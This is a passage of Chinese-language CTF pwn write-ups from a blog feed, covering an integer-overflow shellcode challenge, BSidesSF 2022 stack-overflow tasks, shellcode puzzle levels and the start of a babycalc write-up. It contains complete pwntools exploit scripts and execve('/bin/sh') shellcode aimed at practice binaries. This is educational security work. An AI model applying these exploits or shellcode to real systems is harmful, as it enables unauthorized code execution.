class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027708.png"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF_actf_2019_anotherrepeater</title>
    <url>/posts/bd5b9d1a.html</url>
    <content><![CDATA[<p>通过这道题的学习与收获有：</p>
<p>1、考察的整数溢出和shellcode</p>
<p>2、分析了一下unsigned short int类型强转为short int类型的原理</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012029771.png"></p>
<p>啥都没开，首先考虑shellcode</p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012029772.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012029773.png"></p>
<p>程序主要逻辑很简单，先输入一个数字，判断它是否大于1024，如果大于的话则直接退出。小于的话，就让你输入字符，输入的字节数为刚才输入的数字。这个函数结束之后，开始无限循环去执行puts打印刚才输入的字符。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>首先第一个点是printf给我们泄露了一个buf的地址（也就是栈地址），这里不用想，肯定是帮助我们执行shellcode而泄露的。</p>
<p>第二个点就是发现read输入的地方，距离返回地址有1051个字节。我们正常可输入的1024字节没法去控制返回地址。</p>
<p>然后开始去考虑怎么控制返回地址，我们只能去想办法绕过对1024字节的检查。发现if这里用了强转，仔细分析一下这里。发现v1原本是个unsigned short类型的，但是在进行检查的时候，是用__int16对v1进行操作之后再判断的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012029774.png"></p>
<p>本身unsigned __int16定义的v1一定是个正数，如果输入负数的话，就会产生回绕，自己变成65535。而在判断时以__int16类型进行强转，使得&gt;左边的整体值为-1，从而绕过了检查。</p>
<p>绕过检查之后思路就简单很多了，因为没有NX，直接布置shellcode，由于我们是是有buf的栈地址的，因此思路就是直接布置shellcode，然后填充垃圾数据到返回地址，把返回地址装一个buf的栈地址（我们丝毫不用担心输入字节数的问题，毕竟我们可以输入65535个字节呢），此外也不需要去担心最后的无限循环执行puts，因为我们再返回main函数的时候就已经劫持了程序的执行流使其执行了shellcode。</p>
<h2 id="强转的过程"><a href="#强转的过程" class="headerlink" title="强转的过程"></a>强转的过程</h2><p>这里简单说一下这个强转的过程，因为我感觉这个点应该去研究一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> __int16 a=<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>((__int16)a&gt;<span class="number">1024</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012029775.png"></p>
<p>这个地方直接打印了65535，就说明绕过了if的检查。为什么最后a是65535经过强转就是-1呢？</p>
<p>因为unsigned就代表了无符号整数，也就是最高位的0,1依然表示数字本身。而short int，则代表有符号整数，它的最高位是符号位，只能用来表示正负(1负，0正)。<strong>无符号整数转有符号整数时，如果最高位为0，则符号数等于无符号数。如果最高位为1，则将除去最高位之外剩下的所有位取反再加1，得到的就是有符号数（这步其实也就是取补码）</strong> 转换如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">65535</span> unsigned short <span class="built_in">int</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>    short <span class="built_in">int</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> 0001</span><br></pre></td></tr></table></figure>

<p>所以在if检查的时候，强转得到的-1绕过了检查，但事实上v1一直都是65535（因为它是unsigned short int类型）</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26128)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Be careful. How many chars you want to reapeat?\n&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0x41b</span>+<span class="number">0x4</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesSF 2022 CTF</title>
    <url>/posts/de6602ce.html</url>
    <content><![CDATA[<p>第一次打国外的比赛，由于好几道pwn题出的非常萌新，所以做起来比较舒服（我做出来了三道shellcode闯关和两道无保护的栈题）。其中有两道题的代码是一样的，一个是32位的，一个是64位的。整体利用思路一样，我就详细说一下32位的,64位的这个题同理。</p>
<span id="more"></span>

<h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><p>这道题32位和64位的附件我上传到了百度网盘 需要的话可以下载  <a href="https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj">https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj</a> 提取码：sfaj</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><img src="https://s2.loli.net/2022/06/06/sNCMezaOjPIE9TB.png" alt="image-20220604212148738" style="zoom:50%;" />

<p>只要看到没开NX，就往shellcode方面考虑。</p>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p><img src="https://s2.loli.net/2022/06/06/ravABjUV8EmO3f5.png" alt="image-20220604212652290"></p>
<p>这里程序泄露了好几个地址，并且还给了提示，说只能输入16进制的字符。结合提示继续往下分析。</p>
<img src="https://s2.loli.net/2022/06/06/zrvmtiUA5u94wOF.png" alt="image-20220604212709635" style="zoom:50%;" />

<p>程序正常可以无限次的read函数，每次可以输入0x40字节。</p>
<img src="https://s2.loli.net/2022/06/06/peFn2xCfXPIG7qD.png" alt="image-20220604212728654" style="zoom: 33%;" />

<p>（结合上图）发现这个buf并不能溢出，也不能干扰到任何数据。</p>
<img src="https://s2.loli.net/2022/06/06/lXYNKCBTd16axVh.png" alt="image-20220605184815671" style="zoom:50%;" />

<p>（结合上图）问题出在v2上面，由于read无限次被循环执行,v2却始终没有被清零，意味只要return不被触发，v2就这个下标无限制，可以一直往高地址去写入数据。再看一下decodehex这个函数（下图）</p>
<img src="https://s2.loli.net/2022/06/06/bBkYuNg3m21ZMFH.png" alt="image-20220604212854398" style="zoom:50%;" />

<p>发现这里有个检查，要确定我们输入的数据是否属于0<del>9 a</del>f A~F。如果不是在这个范围的话则会返回-1。</p>
<p><img src="https://s2.loli.net/2022/06/06/zr6kZDycuvI7eba.png" alt="image-20220605183435486"></p>
<p>如果返回-1的话，这个主函数就会退出了，否则就可以把这个字符存在栈里的这个位置（如下图）</p>
<img src="https://s2.loli.net/2022/06/06/XaKo4EHBMrRnkWS.png" alt="image-20220605183958746" style="zoom:50%;" />

<p>可以发现这是在当前函数的返回地址下面，猛一看似乎感觉也不能修改当前函数的返回地址。不过调试一下就发现，challenge函数的返回地址在输入点的下面（这就意味着challenge函数的返回地址是可以被溢出修改的）结合上面分析的，v2没有被清零导致了数据可以无限往下输入造成溢出。</p>
<p><img src="https://s2.loli.net/2022/06/06/nOcv46uWkPiCIo5.png" alt="image-20220605184725900"></p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>由于没开NX，最后获取shell的方式考虑用shellcode，不过shellcode没法第一次就直接写进去，因为即使是用纯字符的shellcode，也无法绕过检查（只有在0-9 a-f A-F之间才能通过检查，纯字符的shellcode会有其他字符)我考虑过把shellcode放到0x40的一次输入里面，然后迁移过去执行，不过由于read一次只能读入0x40，而生成的shellcode有一百二十多个字节，因此这个方法也不行。<strong>最终的方法是劫持执行流，再执行一次read函数（控制参数，劫持返回地址为jmp esp）把shellcode精准写到jmp esp下面的地址即可获取shell。</strong>至于再输入的这个shellcode是字符型的还是字节流无所谓了。</p>
<img src="https://s2.loli.net/2022/06/06/tr6YAaVousmU3c7.png" alt="image-20220605190520975" style="zoom: 50%;" />

<img src="https://s2.loli.net/2022/06/06/ypfbWhX5kPmlDrE.png" alt="image-20220605190652373" style="zoom:50%;" />

<blockquote>
<p>为什么要用jmp esp这个指令？</p>
<p>ret指令相当于pop eip，如果执行ret指令时栈顶的内容是shellcode机器码，那么就会把机器码弹给eip，但是eip仅仅要的是一个指令的地址而已，你却弹给它了一个机器码，因此程序就会崩溃。所以需要用jmp esp，也就是跳转到esp中存储的地址处（也就是跳转到shellcode的地址），进而执行shellcode。</p>
<p>劫持执行流的偏移是怎么得到的？</p>
<p>这个通过IDA是看不出来（也可能是我比较菜QAQ），然后通过gdb去调试，输入一些垃圾字符，看看输入到多少的时候可以溢出到challenge的返回地址。</p>
</blockquote>
<p><strong>需要注意的是，经过调试，写入栈里的地址数据是反着存储的，因此exp上写的地址应该反着写，存储的时候就正了。</strong></p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;tutorial-f0115733.challenges.bsidessf.net&#x27;,3232)</span></span><br><span class="line"><span class="comment">#debug(p,0x080492C7)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;由于栈地址是随机的，所以写了个函数将接收的栈地址给转换一下&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EIP from the calling function is 0x804940f and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x8</span><span class="comment">#调试一下，获取这个偏移</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">48</span>+<span class="string">&#x27;30900408&#x27;</span>+<span class="string">&#x27;c9920408&#x27;</span>+<span class="string">&#x27;00000000&#x27;</span>+a[<span class="number">2</span>:]+<span class="string">&#x27;00001000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<img src="https://s2.loli.net/2022/06/06/3ObNElsnd1YoCfz.png" alt="image-20220605200714258" style="zoom: 33%;" />





<h1 id="Tutorial64"><a href="#Tutorial64" class="headerlink" title="Tutorial64"></a>Tutorial64</h1><p>这道题和32位的思路是完全一样的，不一样的地方是执行read传参的时候要用一下ret2csu。</p>
<h2 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;tutorial64-98df6ee7.challenges.bsidessf.net&#x27;</span>,<span class="number">6464</span>)</span><br><span class="line"><span class="comment">#debug(p,0x40129A)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x40142b</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x401429</span></span><br><span class="line">gadget1_addr=<span class="number">0x401422</span></span><br><span class="line">gadget2_addr=<span class="number">0x401408</span></span><br><span class="line">jmp_addr=<span class="number">0x80492c9</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;RIP from the calling function is 0x4013c1 and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x80</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">56</span>+re(gadget1_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rbx</span></span><br><span class="line">payload+=<span class="string">&#x27;0100000000000000&#x27;</span><span class="comment">#rbp</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rdi</span></span><br><span class="line">payload+=re(target_stack_addr)[<span class="number">2</span>:]<span class="comment">#rsi</span></span><br><span class="line">payload+=<span class="string">&#x27;0001000000000000&#x27;</span><span class="comment">#rdx</span></span><br><span class="line">payload+=re(read_got_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0814400000000000&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload+=<span class="string">&#x27;9c12400000000000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/06/06/KJP2xTnkAZNQiuC.png" alt="image-20220605201640972" style="zoom: 33%;" />



<h1 id="shurdles1"><a href="#shurdles1" class="headerlink" title="shurdles1"></a>shurdles1</h1><p>然后是shellcode闯关题，对于我这种萌新来说做起来还是比较有意思的。</p>
<p>题目就给了个ip和port，连上去直接开始闯关。</p>
<img src="https://s2.loli.net/2022/06/06/Uh2oY3sAGJp1rZX.png" alt="image-20220605202310129" style="zoom: 33%;" />

<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><img src="https://s2.loli.net/2022/06/06/igHeP8r7IaNRJxc.png" alt="image-20220605202357671" style="zoom: 50%;" />

<p>这个就是让你明确写法格式，照着输入即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax, rax</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>这个地方.是核心（这个.困扰我了很久很久，最后才发现这里的问题），或者输入机器码也行，不过我一直写的是汇编。</p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img src="/../img/image-20221007194647365.png" alt="image-20221007194647365"></p>
<p>这一关想让你返回1，这就意味着你的rax寄存器里要是1，然后使用ret返回。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,1</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img src="/../img/image-20221007194632389.png" alt="image-20221007194632389"></p>
<p>这次是想让返回值是2，但是不想让你使用ret指令来完成。给的提示是使用系统调用exit。查一下系统调用号，然后给rdi传参为2，rax放成60(exit的系统调用号)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,2</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p><img src="https://s2.loli.net/2022/06/06/GwDtq9f7nXhjNsd.png" alt="image-20220605203440517"></p>
<p>这次想让返回值为3（can you exit with code 3)这句其实我也不知道咋翻译比较准确，反正我这勉强及格的英语水平能明白它意思，但是描述不是很清楚。</p>
<p>同时你不可以使用ret或者syscall指令。给的提示是让使用pop 和jmp来做到这一点。</p>
<p>ret指令相当于pop rip再跳转到rip。不能使用ret，就可以把这个指令拆开实现。先pop 一个寄存器，然后再jmp跳转过去，其实就等同于ret指令了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,3</span><br><span class="line">pop rdi</span><br><span class="line">jmp rdi</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/06/06/wph5IjqnS7A9VJy.png" alt="image-20220605204139956" style="zoom:50%;" />



<h1 id="shurdles2"><a href="#shurdles2" class="headerlink" title="shurdles2"></a>shurdles2</h1><h2 id="第一关-1"><a href="#第一关-1" class="headerlink" title="第一关"></a>第一关</h2><img src="https://s2.loli.net/2022/06/06/Z98uboqdszTUBG7.png" alt="image-20220605204233997" style="zoom:50%;" />

<p>这一关是想让地址0x12345678出崩溃，给的提示说jmp跳转到这个地址就可以让它崩溃了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x12345678</span><br><span class="line">jmp rax</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第二关-1"><a href="#第二关-1" class="headerlink" title="第二关"></a>第二关</h2><img src="https://s2.loli.net/2022/06/06/goFt8GphHWMBiDb.png" alt="image-20220605204431458" style="zoom:50%;" />

<p>这次人家不让用jmp了，想让用ret。</p>
<p>因为ret是pop rip，所以我们提前把这个0x12345678压到栈顶，然后ret即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x12345678</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第三关-1"><a href="#第三关-1" class="headerlink" title="第三关"></a>第三关</h2><img src="https://s2.loli.net/2022/06/06/c39LyubpJG6kglx.png" alt="image-20220605204625021" style="zoom: 50%;" />

<p>这一关想让你把字符串的地址保存在一个寄存器里，然后把寄存器作为返回值返回了。</p>
<p><strong>汇编语言中DB是定义单字节数据段的意思，编译时DB后面的数据将视为纯数据而不是指令代码</strong></p>
<p>按照给的提示，call会把下一条指令的地址压栈（<strong>也就是把字符串给压栈了</strong>），然后进行了近调用（去执行below里的内容），然后执行了pop rdi<strong>（也就是把字符串的地址弹到了rdi里面）</strong>，拿到了字符串的地址，然后将其赋值给rax，然后ret即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;BSides San Francisco&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,rdi</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/06/06/IfwjcV6CbGMQN8n.png" alt="image-20220605205330512" style="zoom:50%;" />

<h1 id="shurdles3"><a href="#shurdles3" class="headerlink" title="shurdles3"></a>shurdles3</h1><h2 id="第一关-2"><a href="#第一关-2" class="headerlink" title="第一关"></a>第一关</h2><img src="https://s2.loli.net/2022/06/06/nqYRJirNV2seDm5.png" alt="image-20220605205852136" style="zoom:50%;" />

<p>这个很简单，之前也做过了，就是要使用exit退出时的代码为123。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,123</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第二关-2"><a href="#第二关-2" class="headerlink" title="第二关"></a>第二关</h2><img src="https://s2.loli.net/2022/06/06/CF6o7kVvJp5sXDA.png" alt="image-20220605210132746" style="zoom:50%;" />

<p>想系统调用write，然后将Hello,BSides!这句话打印出来并且使用exit退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call write</span><br><span class="line">db &quot;Hello, BSides!&quot;,0 </span><br><span class="line">write:</span><br><span class="line">pop rsi</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,14</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,60</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h2 id="第三关-2"><a href="#第三关-2" class="headerlink" title="第三关"></a>第三关</h2><img src="https://s2.loli.net/2022/06/06/mWKTz8U1xRbM6dq.png" alt="image-20220605210723155" style="zoom:50%;" />

<p>此时来到了最后一关。</p>
<p>想让我们用open,read,write来读出flag并且进行退出（人家还说Be sure to exit cleanly，我这个英语渣渣认为是要用ret返回并且返回值为0）。flag位于&#x2F;app&#x2F;level2.yaml</p>
<p>那这题不就和打宝宝一样简单么。<strong>需要注意的是人家提示说open返回的这个文件描述符是随机的，并不是3，所以这里要用mov把rax里装的返回值给传过来</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;/app/level2.yaml&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,2</span><br><span class="line">mov rsi,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">push 48</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">mov rdx,48</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,0</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/06/06/zOueQdn7YsKtD6g.png" alt="image-20220605211437993" style="zoom:50%;" />]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>2023西湖论剑 PWN 部分WP</title>
    <url>/posts/1c9fd873.html</url>
    <content><![CDATA[<p>一共五个 <code>PWN</code> ，有两个零解，还有一个很少解的题目，本人菜鸡选手做不出来，估计后面复现也够呛，就记录一下比赛做出来的两个常规 <code>PWN</code>。</p>
<span id="more"></span>



<h2 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021853480.png" alt="image-20230202185343223"></p>
<h3 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021855407.png" alt="image-20230202185510362"></p>
<p>溢出了 <code>rbp</code> 末字节为 <code>\x00</code> ，并且往 <code>buf</code> 里输入数据的时候可以控制如下所有变量</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021856648.png" alt="image-20230202185640585" style="zoom:50%;" />

<p>结合这一行代码 <code>*(&amp;v3 + i) = v0;</code> ，因为 <code>i</code> 是可以控制的，所以此处有一次的任意栈地址单字节写入的机会，通过 <code>gdb</code> 调试发现返回地址和 <code>leave ; ret</code> 指令的地址前两个字节都一样，所以向返回地址末尾写入 <code>\x17</code> ，以此来作出 <code>leave ; ret</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021901380.png" alt="image-20230202190116289"></p>
<p>需要注意的是因为将 <code>i</code> 改大之后，下一次的循环就一定进不去了，所以这个任意栈地址写单字节只有一次机会。同时将 <code>buf</code> 写满，让 <code>rbp</code> 末尾为  <code>0</code> （此时 <code>rbp</code> 指向了 <code>buf</code> 中的数据）也就意味着接下来触发栈迁移，会迁移到我们可控的地方执行 <code>rop</code></p>
<p>上述成功的前提是要把这个方程组给解出来，先安装下 <code>z3</code> 这个包 ，然后用 <code>python</code> 跑一下即可，脚本如下</p>
